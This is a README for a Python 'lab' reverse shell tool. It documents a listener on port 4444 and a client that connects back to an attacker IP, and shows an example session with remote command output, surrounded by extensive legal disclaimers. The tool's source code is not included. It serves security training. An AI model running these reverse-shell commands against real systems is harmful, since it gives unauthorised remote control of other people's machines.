> **⚠️ EDUCATIONAL USE ONLY — AUTHORIZED TESTING ONLY.**
> This project exists for education, research, and **defense of systems you own
> or hold explicit written authorization to assess**. Unauthorized use is
> prohibited and may be illegal. Read [ETHICS.md](ETHICS.md) and
> [SCOPE.md](SCOPE.md) before use. Use at your own risk; **AS IS**, no warranty.
# Reverse Shell Lab Tool

⚠️ **LAB USE ONLY** - This tool is designed for isolated lab environments and educational purposes. DO NOT deploy outside your lab or expose to the internet.

## Overview

A minimal reverse shell implementation for educational purposes. Demonstrates how reverse shells work in a controlled lab environment. Includes both listener (attacker) and client (target) components.

## Features

- **Listener Mode**: Set up a reverse shell listener
- **Client Mode**: Connect back to listener
- **Interactive Shell**: Execute commands remotely
- **Lab-Safe**: Designed for isolated lab environments only
- **Educational**: Learn about reverse shell techniques

## Installation

### Requirements

- Python 3.8+
- Standard library only (no external dependencies!)

### Setup

```bash
# Clone the repository
git clone https://github.com/5h4d0wn1k/lab-reverse-shell.git
cd lab-reverse-shell

# No installation needed!
python lab_shell.py --help
```

## Usage

### Listener Mode (Attacker Box)

```bash
# Start listener on attacker machine
python lab_shell.py listen --host 0.0.0.0 --port 4444
```

### Client Mode (Target Box)

```bash
# Connect from target machine
python lab_shell.py connect --host <attacker-ip> --port 4444
```

## Command-Line Options

### Listener Mode

| Option | Description |
|--------|-------------|
| `listen` | Start listener mode |
| `--host` | Listen address (default: 0.0.0.0) |
| `--port` | Listen port (default: 4444) |

### Client Mode

| Option | Description |
|--------|-------------|
| `connect` | Start client mode |
| `--host` | Attacker IP address (required) |
| `--port` | Attacker port (default: 4444) |

## Usage Example

### Step 1: Start Listener

On attacker machine (192.168.1.100):
```bash
python lab_shell.py listen --host 0.0.0.0 --port 4444
```

Output:
```
⚠️  Lab-only reverse shell listener. Do not expose to the internet.
[+] Connection from ('192.168.1.50', 54321)
shell>
```

### Step 2: Connect Client

On target machine (192.168.1.50):
```bash
python lab_shell.py connect --host 192.168.1.100 --port 4444
```

### Step 3: Execute Commands

On listener, you can now execute commands:
```bash
shell> whoami
user

shell> pwd
/home/user

shell> ls -la
total 24
drwxr-xr-x 2 user user 4096 Dec 15 10:00 .
...
```

## Security Warnings

⚠️ **CRITICAL**: This tool is for LAB USE ONLY.

- **NEVER** expose listener to the internet
- **ONLY** use in isolated lab environments
- **ONLY** use on systems you own
- **NEVER** use on production systems
- Unauthorized access is illegal

## Use Cases

- **Security Training**: Learn about reverse shell techniques
- **Lab Exercises**: Practice in isolated lab environments
- **Educational Purposes**: Understand reverse shell mechanics
- **Penetration Testing**: Authorized security assessments

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## ⚠️ Legal Disclaimer

### Educational Purpose Only
This tool is provided strictly for **educational purposes** and **authorized security testing** only. It is intended to help security professionals and students learn about security concepts in controlled environments.

### Authorized Use Only
- You must have **explicit written authorization** before testing any system you do not own
- Unauthorized access to computer systems is **illegal** and punishable under laws including but not limited to the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and similar legislation worldwide
- Only use this tool on systems you own, have permission to test, or in isolated lab environments

### No Warranty
This software is provided "AS IS" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. The author makes no representations or warranties regarding the accuracy, completeness, or reliability of this software.

### Limitation of Liability
**In no event shall the author (Nikhil Nagpure) be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services; loss of use, data, or profits; or business interruption) however caused and on any theory of liability, whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of the use of this software, even if advised of the possibility of such damage.**

### User Responsibility
- The user assumes **full responsibility** for any consequences resulting from the use of this tool
- The author is **not responsible** for any misuse, damage, or illegal activities performed with this software
- Users are solely responsible for ensuring compliance with all applicable local, state, national, and international laws and regulations

### Indemnification
By using this software, you agree to **indemnify, defend, and hold harmless** the author from and against any and all claims, liabilities, damages, losses, costs, and expenses (including reasonable attorneys fees) arising from or related to your use of this software.

### Responsible Disclosure
If you discover vulnerabilities using this tool, please follow responsible disclosure practices and report them to the affected parties through appropriate channels.

---

**By using this software, you acknowledge that you have read, understood, and agree to be bound by this disclaimer.**
## License

This project is for educational purposes only. Use responsibly and ethically.

---

**CRITICAL**: LAB USE ONLY - Never expose to the internet or use on production systems!
